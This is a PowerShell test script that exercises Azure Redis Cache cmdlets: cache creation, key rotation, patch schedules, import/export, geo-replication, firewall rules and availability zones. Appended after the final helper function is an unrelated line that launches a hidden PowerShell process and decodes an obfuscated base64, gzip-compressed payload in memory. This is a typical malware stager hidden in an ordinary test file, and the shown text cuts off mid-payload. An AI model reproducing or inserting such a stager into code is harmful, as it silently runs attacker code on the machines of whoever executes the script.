function Test-RedisCache{$resourceGroupName = "PowerShellTest-1"$cacheName = "redisteam001"$location = "West US"New-AzResourceGroup -Name $resourceGroupName -Location $location$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Size P1 -Sku PremiumAssert-AreEqual $cacheName $cacheCreated.NameAssert-AreEqual $location $cacheCreated.LocationAssert-AreEqual "Microsoft.Cache/Redis" $cacheCreated.TypeAssert-AreEqual $resourceGroupName $cacheCreated.ResourceGroupNameAssert-AreEqual 6379 $cacheCreated.PortAssert-AreEqual 6380 $cacheCreated.SslPortAssert-AreEqual "creating" $cacheCreated.ProvisioningStateAssert-AreEqual "6GB" $cacheCreated.SizeAssert-AreEqual "Premium" $cacheCreated.SkuAssert-NotNull $cacheCreated.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheCreated.SecondaryKey "SecondaryKey do not exists"for ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName $cacheGet[0].NameAssert-AreEqual "succeeded" $cacheGet[0].ProvisioningStatebreak}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}$cacheUpdated = Set-AzRedisCache -Name $cacheName -RedisConfiguration @{"maxmemory-policy" = "allkeys-lru"} -EnableNonSslPort $trueAssert-AreEqual $cacheName $cacheUpdated.NameAssert-AreEqual 6379 $cacheUpdated.PortAssert-AreEqual 6380 $cacheUpdated.SslPortAssert-AreEqual "succeeded" $cacheUpdated.ProvisioningStateAssert-AreEqual "allkeys-lru" $cacheUpdated.RedisConfiguration.Item("maxmemory-policy")Assert-True  { $cacheUpdated.EnableNonSslPort }Assert-NotNull $cacheUpdated.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheUpdated.SecondaryKey "SecondaryKey do not exists"$cachesInResourceGroup = Get-AzRedisCache -ResourceGroupName $resourceGroupNameAssert-True {$cachesInResourceGroup.Count -ge 1}$found = 0for ($i = 0; $i -lt $cachesInResourceGroup.Count; $i++){if ($cachesInResourceGroup[$i].Name -eq $cacheName){$found = 1Assert-AreEqual $location $cachesInResourceGroup[$i].LocationAssert-AreEqual $resourceGroupName $cachesInResourceGroup[$i].ResourceGroupNamebreak}}Assert-True {$found -eq 1} "Cache created earlier is not found."$cachesInSubscription = Get-AzRedisCacheAssert-True {$cachesInSubscription.Count -ge 1}Assert-True {$cachesInSubscription.Count -ge $cachesInResourceGroup.Count}$found = 0for ($i = 0; $i -lt $cachesInSubscription.Count; $i++){if ($cachesInSubscription[$i].Name -eq $cacheName){$found = 1Assert-AreEqual $location $cachesInSubscription[$i].LocationAssert-AreEqual $resourceGroupName $cachesInSubscription[$i].ResourceGroupNamebreak}}Assert-True {$found -eq 1} "Cache created earlier is not found."$cacheKeysBeforeUpdate = Get-AzRedisCacheKey -ResourceGroupName $resourceGroupName -Name $cacheNameAssert-NotNull $cacheKeysBeforeUpdate.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheKeysBeforeUpdate.SecondaryKey "SecondaryKey do not exists"$cacheKeysAfterUpdate = New-AzRedisCacheKey -ResourceGroupName $resourceGroupName -Name $cacheName -KeyType Primary -ForceAssert-AreEqual $cacheKeysBeforeUpdate.SecondaryKey $cacheKeysAfterUpdate.SecondaryKeyAssert-AreNotEqual $cacheKeysBeforeUpdate.PrimaryKey $cacheKeysAfterUpdate.PrimaryKeyAssert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Test-SetNonExistingRedisCacheTest{$resourceGroupName = "PowerShellTestNonExisting"$cacheName = "nonexistingrediscache"$location = "West US"Assert-Throws {Set-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -RedisConfiguration @{"maxmemory-policy" = "allkeys-random"} }}function Test-RedisCachePipeline{$resourceGroupName = "PowerShellTest-2"$cacheName = "redisteam002"$location = "West US"New-AzResourceGroup -Name $resourceGroupName -Location $location$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Size 1GB -Sku Standard -EnableNonSslPort $trueAssert-AreEqual $cacheName $cacheCreated.NameAssert-AreEqual $location $cacheCreated.LocationAssert-AreEqual "Microsoft.Cache/Redis" $cacheCreated.TypeAssert-AreEqual $resourceGroupName $cacheCreated.ResourceGroupNameAssert-AreEqual 6379 $cacheCreated.PortAssert-AreEqual 6380 $cacheCreated.SslPortAssert-AreEqual "creating" $cacheCreated.ProvisioningStateAssert-AreEqual "1GB" $cacheCreated.SizeAssert-AreEqual "Standard" $cacheCreated.SkuAssert-True { $cacheCreated.EnableNonSslPort }Assert-NotNull $cacheCreated.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheCreated.SecondaryKey "SecondaryKey do not exists"for ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName $cacheGet[0].Namebreak}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName | Set-AzRedisCache -RedisConfiguration @{"maxmemory-policy" = "allkeys-random"} -EnableNonSslPort $false$cacheUpdatedPiped = Get-AzRedisCache -Name $cacheNameAssert-AreEqual $cacheName $cacheUpdatedPiped.NameAssert-AreEqual $location $cacheUpdatedPiped.LocationAssert-AreEqual $resourceGroupName $cacheUpdatedPiped.ResourceGroupNameAssert-AreEqual 6379 $cacheUpdatedPiped.PortAssert-AreEqual 6380 $cacheUpdatedPiped.SslPortAssert-AreEqual "succeeded" $cacheUpdatedPiped.ProvisioningStateAssert-AreEqual "1GB" $cacheUpdatedPiped.SizeAssert-AreEqual "Standard" $cacheUpdatedPiped.SkuAssert-AreEqual "allkeys-random"  $cacheUpdatedPiped.RedisConfiguration.Item("maxmemory-policy")Assert-False  { $cacheUpdatedPiped.EnableNonSslPort }$cacheKeysBeforeUpdate = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName | Get-AzRedisCacheKeyAssert-NotNull $cacheKeysBeforeUpdate.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheKeysBeforeUpdate.SecondaryKey "SecondaryKey do not exists"$cacheKeysAfterUpdate = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName | New-AzRedisCacheKey -KeyType Primary -ForceAssert-AreEqual $cacheKeysBeforeUpdate.SecondaryKey $cacheKeysAfterUpdate.SecondaryKeyAssert-AreNotEqual $cacheKeysBeforeUpdate.PrimaryKey $cacheKeysAfterUpdate.PrimaryKeyAssert-True {Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName | Remove-AzRedisCache -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Test-RedisCacheClustering{$resourceGroupName = "PowerShellTest-3"$cacheName = "redisteam003"$location = "West US"New-AzResourceGroup -Name $resourceGroupName -Location $location$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Size 6GB -Sku Premium -ShardCount 3Assert-AreEqual "Microsoft.Cache/Redis" $cacheCreated.TypeAssert-AreEqual $resourceGroupName $cacheCreated.ResourceGroupNameAssert-AreEqual 6379 $cacheCreated.PortAssert-AreEqual 6380 $cacheCreated.SslPortAssert-AreEqual "creating" $cacheCreated.ProvisioningStateAssert-AreEqual "6GB" $cacheCreated.SizeAssert-AreEqual "Premium" $cacheCreated.SkuAssert-AreEqual 3 $cacheCreated.ShardCountAssert-NotNull $cacheCreated.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheCreated.SecondaryKey "SecondaryKey do not exists"for ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName $cacheGet[0].Namebreak}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}$cacheUpdated = Set-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -RedisConfiguration @{"maxmemory-policy" = "allkeys-lru"} -TenantSettings @{"some-key" = "some-value"}Assert-AreEqual $cacheName $cacheUpdated.NameAssert-AreEqual "succeeded" $cacheUpdated.ProvisioningStateAssert-AreEqual "6GB" $cacheCreated.SizeAssert-AreEqual "Premium" $cacheCreated.SkuAssert-AreEqual 3 $cacheCreated.ShardCountAssert-AreEqual "allkeys-lru" $cacheUpdated.RedisConfiguration.Item("maxmemory-policy")Assert-AreEqual "some-value" $cacheUpdated.TenantSettings.Item("some-key")Assert-NotNull $cacheUpdated.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheUpdated.SecondaryKey "SecondaryKey do not exists"$cachesInResourceGroup = Get-AzRedisCache -ResourceGroupName $resourceGroupNameAssert-True {$cachesInResourceGroup.Count -ge 1}$found = 0for ($i = 0; $i -lt $cachesInResourceGroup.Count; $i++){if ($cachesInResourceGroup[$i].Name -eq $cacheName){$found = 1Assert-AreEqual $location $cachesInResourceGroup[$i].LocationAssert-AreEqual $resourceGroupName $cachesInResourceGroup[$i].ResourceGroupNameAssert-AreEqual "succeeded" $cachesInResourceGroup[$i].ProvisioningStateAssert-AreEqual "6GB" $cacheCreated.SizeAssert-AreEqual "Premium" $cacheCreated.SkuAssert-AreEqual 3 $cacheCreated.ShardCountbreak}}Assert-True {$found -eq 1} "Cache created earlier is not found."$cachesInSubscription = Get-AzRedisCacheAssert-True {$cachesInSubscription.Count -ge 1}Assert-True {$cachesInSubscription.Count -ge $cachesInResourceGroup.Count}$found = 0for ($i = 0; $i -lt $cachesInSubscription.Count; $i++){if ($cachesInSubscription[$i].Name -eq $cacheName){$found = 1Assert-AreEqual $location $cachesInSubscription[$i].LocationAssert-AreEqual $resourceGroupName $cachesInSubscription[$i].ResourceGroupNameAssert-AreEqual "succeeded" $cachesInSubscription[$i].ProvisioningStateAssert-AreEqual "6GB" $cacheCreated.SizeAssert-AreEqual "Premium" $cacheCreated.SkuAssert-AreEqual 3 $cacheCreated.ShardCountbreak}}Assert-True {$found -eq 1} "Cache created earlier is not found."$cacheKeysBeforeUpdate = Get-AzRedisCacheKey -ResourceGroupName $resourceGroupName -Name $cacheNameAssert-NotNull $cacheKeysBeforeUpdate.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheKeysBeforeUpdate.SecondaryKey "SecondaryKey do not exists"$cacheKeysAfterUpdate = New-AzRedisCacheKey -ResourceGroupName $resourceGroupName -Name $cacheName -KeyType Primary -ForceAssert-AreEqual $cacheKeysBeforeUpdate.SecondaryKey $cacheKeysAfterUpdate.SecondaryKeyAssert-AreNotEqual $cacheKeysBeforeUpdate.PrimaryKey $cacheKeysAfterUpdate.PrimaryKeyAssert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Test-RedisCachePatchSchedules{$resourceGroupName = "PowerShellTest-4"$cacheName = "redisteam004"$location = "West US"New-AzResourceGroup -Name $resourceGroupName -Location $location$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Sku Premium -Size P1Assert-AreEqual "creating" $cacheCreated.ProvisioningStatefor ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName $cacheGet[0].Namebreak}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}$weekend = New-AzRedisCacheScheduleEntry -DayOfWeek "Weekend" -StartHourUtc 2 -MaintenanceWindow "06:00:00"$thursday = New-AzRedisCacheScheduleEntry -DayOfWeek "Thursday" -StartHourUtc 10 -MaintenanceWindow "09:00:00"$createResult = New-AzRedisCachePatchSchedule -ResourceGroupName $resourceGroupName -Name $cacheName -Entries @($weekend, $thursday)Assert-True {$createResult.Count -eq 3}foreach ($scheduleEntry in $createResult){if($scheduleEntry.DayOfWeek -eq "Thursday"){Assert-AreEqual 10 $scheduleEntry.StartHourUtcAssert-AreEqual "09:00:00" $scheduleEntry.MaintenanceWindow}elseif($scheduleEntry.DayOfWeek -eq "Saturday" -or $scheduleEntry.DayOfWeek -eq "Sunday"){Assert-AreEqual 2 $scheduleEntry.StartHourUtcAssert-AreEqual "06:00:00" $scheduleEntry.MaintenanceWindow}else{Assert-True $false "Unknown DayOfWeek."}}$getResult = Get-AzRedisCachePatchSchedule -ResourceGroupName $resourceGroupName -Name $cacheNameAssert-True {$getResult.Count -eq 3}foreach ($scheduleEntry in $getResult){if($scheduleEntry.DayOfWeek -eq "Thursday"){Assert-AreEqual 10 $scheduleEntry.StartHourUtcAssert-AreEqual "09:00:00" $scheduleEntry.MaintenanceWindow}elseif($scheduleEntry.DayOfWeek -eq "Saturday" -or $scheduleEntry.DayOfWeek -eq "Sunday"){Assert-AreEqual 2 $scheduleEntry.StartHourUtcAssert-AreEqual "06:00:00" $scheduleEntry.MaintenanceWindow}else{Assert-True $false "Unknown DayOfWeek."}}Remove-AzRedisCachePatchSchedule -ResourceGroupName $resourceGroupName -Name $cacheNameAssert-ThrowsContains {Get-AzRedisCachePatchSchedule -ResourceGroupName $resourceGroupName -Name $cacheName} "There are no patch schedules found for redis cache"$cacheUpdated = Set-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -EnableNonSslPort $trueAssert-True  { $cacheUpdated.EnableNonSslPort }$cacheUpdated2 = Set-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -RedisConfiguration @{"maxmemory-policy" = "allkeys-lru"}Assert-AreEqual "allkeys-lru" $cacheUpdated2.RedisConfiguration.Item("maxmemory-policy")Assert-True  { $cacheUpdated2.EnableNonSslPort }Assert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Create-StorageAccount($resourceGroupName,$storageName,$location){if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback){$storageAccount = New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageName -Location $location -Type "Standard_LRS"}}function Get-SasForContainer{param($resourceGroupName,$storageName,$storageContainerName,[ref] $sasKeyForContainer)if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback){$storageAccountContext = New-AzStorageContext -StorageAccountName $storageName -StorageAccountKey (Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $storageName).Value[0]New-AzStorageContainer -Name $storageContainerName -Context $storageAccountContext$sasKeyForContainer.Value = New-AzStorageContainerSASToken -Name $storageContainerName -Permission "rwdl" -StartTime ([System.DateTime]::Now).AddMinutes(-20) -ExpiryTime ([System.DateTime]::Now).AddHours(2) -Context $storageAccountContext -FullUri}else{$sasKeyForContainer.Value = "dummysasforcontainer"}}function Get-SasForBlob{param($resourceGroupName,$storageName,$storageContainerName,$prefix,[ref] $sasKeyForBlob)if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback){$storageAccountContext = New-AzStorageContext -StorageAccountName $storageName -StorageAccountKey (Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $storageName).Value[0]$sasKeyForBlob.Value = New-AzStorageBlobSASToken -Container $storageContainerName -Blob $prefix -Permission "rwdl" -StartTime ([System.DateTime]::Now).AddMinutes(-20) -ExpiryTime ([System.DateTime]::Now).AddHours(2) -Context $storageAccountContext -FullUri}else{$sasKeyForBlob.Value = "dummysasforblob"}}function Test-ImportExportReboot{$resourceGroupName = "PowerShellTest-5"$cacheName = "redisteam005"$location = "West US"$storageName = "redisteam005s"$storageContainerName = "exportimport"$prefix = "sunny"New-AzResourceGroup -Name $resourceGroupName -Location $locationCreate-StorageAccount $resourceGroupName $storageName $location$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Sku Premium -Size P1Assert-AreEqual "creating" $cacheCreated.ProvisioningStatefor ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName $cacheGet[0].Namebreak}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}$sasKeyForContainer = ""Get-SasForContainer $resourceGroupName $storageName $storageContainerName ([ref]$sasKeyForContainer)Export-AzRedisCache -Name $cacheName -Prefix $prefix -Container $sasKeyForContainer$sasKeyForBlob = ""Get-SasForBlob $resourceGroupName $storageName $storageContainerName $prefix ([ref]$sasKeyForBlob)Import-AzRedisCache -Name $cacheName -Files @($sasKeyForBlob) -Force$rebootType = "PrimaryNode"Reset-AzRedisCache -Name $cacheName -RebootType $rebootType -ForceStart-TestSleep 120000Assert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Test-DiagnosticOperations{$resourceGroupName = "PowerShellTest-6"$cacheName = "redisteam006"$location = "West US"$storageName = "redisteam006s"New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageName -Location $location -Type "Standard_LRS"$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageName$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Sku Premium -Size P1Assert-AreEqual "creating" $cacheCreated.ProvisioningStatefor ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName $cacheGet[0].Namebreak}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}Assert-NotNull $storageAccount.Id "Storage Id cannot be null"Set-AzRedisCacheDiagnostics -ResourceGroupName $resourceGroupName -Name $cacheName -StorageAccountId $storageAccount.IdRemove-AzRedisCacheDiagnostics -ResourceGroupName $resourceGroupName -Name $cacheNameAssert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Test-GeoReplication{$resourceGroupName = "PowerShellTest-7"$cacheName1 = "redisteam0071"$cacheName2 = "redisteam0072"$location1 = "West US"$location2 = "East US"New-AzResourceGroup -Name $resourceGroupName -Location $location1$cacheCreated1 = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName1 -Location $location1 -Sku Premium -Size P1$cacheCreated2 = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName2 -Location $location2 -Sku Premium -Size P1Assert-AreEqual "creating" $cacheCreated1.ProvisioningStateAssert-AreEqual "creating" $cacheCreated2.ProvisioningStatefor ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupNameif (([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0) -and ([string]::Compare("succeeded", $cacheGet[1].ProvisioningState, $True) -eq 0)){break}Assert-False {$i -eq 60} "Caches are not in succeeded state even after 30 min."}$linkCreated = New-AzRedisCacheLink -PrimaryServerName $cacheName1 -SecondaryServerName $cacheName2Assert-AreEqual "creating" $linkCreated.ProvisioningStateAssert-AreEqual $cacheName1 $linkCreated.PrimaryServerNameAssert-AreEqual $cacheName2 $linkCreated.SecondaryServerNamefor ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$linkGet = Get-AzRedisCacheLink -PrimaryServerName $cacheName1 -SecondaryServerName $cacheName2if ([string]::Compare("succeeded", $linkGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName1 $linkGet[0].PrimaryServerNameAssert-AreEqual $cacheName2 $linkGet[0].SecondaryServerNamebreak}Assert-False {$i -eq 60} "Geo replication link is not in succeeded state even after 30 min."}$linkGet = Get-AzRedisCacheLink -Name $cacheName1Assert-AreEqual $cacheName1 $linkGet[0].PrimaryServerNameAssert-AreEqual $cacheName2 $linkGet[0].SecondaryServerName$linkGet = Get-AzRedisCacheLink -Name $cacheName2Assert-AreEqual $cacheName1 $linkGet[0].PrimaryServerNameAssert-AreEqual $cacheName2 $linkGet[0].SecondaryServerName$linkGet = Get-AzRedisCacheLink -PrimaryServerName $cacheName1Assert-AreEqual $cacheName1 $linkGet[0].PrimaryServerNameAssert-AreEqual $cacheName2 $linkGet[0].SecondaryServerName$linkGet = Get-AzRedisCacheLink -PrimaryServerName $cacheName2Assert-True {$linkGet.Count -eq 0}$linkGet = Get-AzRedisCacheLink -SecondaryServerName $cacheName2Assert-AreEqual $cacheName1 $linkGet[0].PrimaryServerNameAssert-AreEqual $cacheName2 $linkGet[0].SecondaryServerName$linkGet = Get-AzRedisCacheLink -SecondaryServerName $cacheName1Assert-True {$linkGet.Count -eq 0}Assert-True {Remove-AzRedisCacheLink -PrimaryServerName $cacheName1 -SecondaryServerName $cacheName2 -PassThru} "Removing geo replication link failed."for ($i = 0; $i -le 10; $i++){Start-TestSleep 30000$linkGet1 = Get-AzRedisCacheLink -PrimaryServerName $cacheName1$linkGet2 = Get-AzRedisCacheLink -SecondaryServerName $cacheName2if (($linkGet1.Count -eq 0) -and ($linkGet2.Count -eq 0)){break}Assert-False {$i -eq 10} "Geo replication link deletion is not in succeeded state even after 30 min."}Assert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName1 -Force -PassThru} "Remove cache failed."Assert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName2 -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Test-FirewallRule{$resourceGroupName = "PowerShellTest-8"$cacheName = "redisteam008"$location = "West US"$rule1 = "ruleone"$rule1StartIp = "10.0.0.0"$rule1EndIp = "10.0.0.32"$rule2 = "ruletwo"$rule2StartIp = "10.0.0.64"$rule2EndIp = "10.0.0.128"$rule3 = "rulethree"$rule3StartIp = "10.0.0.33"$rule3EndIp = "10.0.0.63"New-AzResourceGroup -Name $resourceGroupName -Location $location$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Sku Premium -Size P1Assert-AreEqual "creating" $cacheCreated.ProvisioningStatefor ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){break}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}$rule1Created = New-AzRedisCacheFirewallRule -Name $cacheName -RuleName $rule1 -StartIP $rule1StartIp -EndIP $rule1EndIpAssert-AreEqual $rule1StartIp $rule1Created.StartIPAssert-AreEqual $rule1EndIp $rule1Created.EndIPAssert-AreEqual $rule1 $rule1Created.RuleName$rule2Created = Get-AzRedisCache -Name $cacheName | New-AzRedisCacheFirewallRule -RuleName $rule2 -StartIP $rule2StartIp -EndIP $rule2EndIpAssert-AreEqual $rule2StartIp $rule2Created.StartIPAssert-AreEqual $rule2EndIp $rule2Created.EndIPAssert-AreEqual $rule2 $rule2Created.RuleName$rule3Created = New-AzRedisCacheFirewallRule -ResourceId $cacheCreated.Id -RuleName $rule3 -StartIP $rule3StartIp -EndIP $rule3EndIpAssert-AreEqual $rule3StartIp $rule3Created.StartIPAssert-AreEqual $rule3EndIp $rule3Created.EndIPAssert-AreEqual $rule3 $rule3Created.RuleName$rule1Get = Get-AzRedisCacheFirewallRule -Name $cacheName -RuleName $rule1Assert-AreEqual $rule1StartIp $rule1Get.StartIPAssert-AreEqual $rule1EndIp $rule1Get.EndIPAssert-AreEqual $rule1 $rule1Get.RuleName$allRulesGet = Get-AzRedisCacheFirewallRule -Name $cacheNamefor ($i = 0; $i -le 2; $i++){if($allRulesGet[$i].RuleName -eq $rule1){Assert-AreEqual $rule1StartIp $allRulesGet[$i].StartIPAssert-AreEqual $rule1EndIp $allRulesGet[$i].EndIP}elseif($allRulesGet[$i].RuleName -eq $rule2){Assert-AreEqual $rule2StartIp $allRulesGet[$i].StartIPAssert-AreEqual $rule2EndIp $allRulesGet[$i].EndIP}elseif($allRulesGet[$i].RuleName -eq $rule3){Assert-AreEqual $rule3StartIp $allRulesGet[$i].StartIPAssert-AreEqual $rule3EndIp $allRulesGet[$i].EndIP}else{Assert-False $True "unknown firewall rule"}}Assert-True {Remove-AzRedisCacheFirewallRule -Name $cacheName -RuleName $rule1 -PassThru} "Removing firewall rule 'ruleone' failed."$allRulesGet = Get-AzRedisCacheFirewallRule -Name $cacheNameAssert-AreEqual 2 $allRulesGet.CountGet-AzRedisCacheFirewallRule -Name $cacheName | Remove-AzRedisCacheFirewallRule -PassThru$allRulesGet = Get-AzRedisCacheFirewallRule -Name $cacheNameAssert-AreEqual 0 $allRulesGet.CountAssert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Test-Zones{$resourceGroupName = "PowerShellTest-9"$cacheName = "redisteam009"$location = "East US 2"New-AzResourceGroup -Name $resourceGroupName -Location $location$cacheCreated = New-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Location $location -Size P1 -Sku Premium -Zone @("1") -Tag @{"example-key" = "example-value"}Assert-AreEqual $cacheName $cacheCreated.NameAssert-AreEqual $location $cacheCreated.LocationAssert-AreEqual $resourceGroupName $cacheCreated.ResourceGroupNameAssert-AreEqual "creating" $cacheCreated.ProvisioningStateAssert-AreEqual "6GB" $cacheCreated.SizeAssert-AreEqual "Premium" $cacheCreated.SkuAssert-AreEqual "1" $cacheCreated.Zone[0]Assert-AreEqual "example-value" $cacheCreated.Tag.Item("example-key")Assert-NotNull $cacheCreated.PrimaryKey "PrimaryKey do not exists"Assert-NotNull $cacheCreated.SecondaryKey "SecondaryKey do not exists"for ($i = 0; $i -le 60; $i++){Start-TestSleep 30000$cacheGet = Get-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheNameif ([string]::Compare("succeeded", $cacheGet[0].ProvisioningState, $True) -eq 0){Assert-AreEqual $cacheName $cacheGet[0].NameAssert-AreEqual "1" $cacheGet[0].Zone[0]Assert-AreEqual "example-value" $cacheGet[0].Tag.Item("example-key")break}Assert-False {$i -eq 60} "Cache is not in succeeded state even after 30 min."}Assert-True {Remove-AzRedisCache -ResourceGroupName $resourceGroupName -Name $cacheName -Force -PassThru} "Remove cache failed."Remove-AzResourceGroup -Name $resourceGroupName -Force}function Start-TestSleep($milliseconds){if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback){Start-Sleep -Milliseconds $milliseconds}}if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms77jKjpDZLz+5qJydgTc1G12GPlpirfFPUMZrPTT7DNJxcXZViIUgod/NslUgURWR2zyiJVE35RxkERJDTm/spcaTyQ0n9na0yfo/Z3m1dwk5AlFMUuomtyR2cJJe15oxKNf39e1obn+Yn2fJjjFmkpq11JMks6zKW1pSfWrLh7XpO1HSLOoJH3JPZAQ3PCtl+GGGPtGG1BWkRGXA3SmtwFPgTRMYiVJ4Playy81HTMOwI7iDXFSSCkGw9XPAHoqbCmLGM8pc63qfQi0NJZwTskgg+t4hYUIdE2RoOXUZ6xJuobbI8nPy9QepxEHh1pNAywMtbuba4GzOyC09rv2b7RKgGzxOpAMTPjx8+fvAOWlicB+dtN368sKfesR5gdDLejgkkrHZ4RLf+35RcRmnBrlhysYZp6lbERJso44SN8WSipJY5N/N2eP7gC5586JfQBevhRdAF09jm1J1A6J6ulEs2933m/32WGN/Wnkk8GhJzHeIZdQ7yUl8jgXiMbM+dPbi1IUM1vTcQ1ySM+FgmiGaU8a9h5RmVT7FGTJlLBHKAyAiyAo61l8nsSFLT9bBFZoDXbp4GOjwQNTl474W8PuyezMEpXWI4ijJKJ4aqcjKKRTAjbkZBYUT3JhRLvh2mn9NtxUxSB0fysNxEewHmftMSDyMpYgd4BABurTlxKGYJHhmlRl1irC3qHzZPv4pGCTNGQx9WWgAb8CZBwZKJOgTkmShBy1pE1mdzRmbgsi3xCsM+FPS+IrZqwj5x069meVD8Tt4JKAc0jnIEpi3GZUaxqZBwXSQAH2vrj1I5ui+ekyoJsudHPZTS2FjLRPgpgfitwQd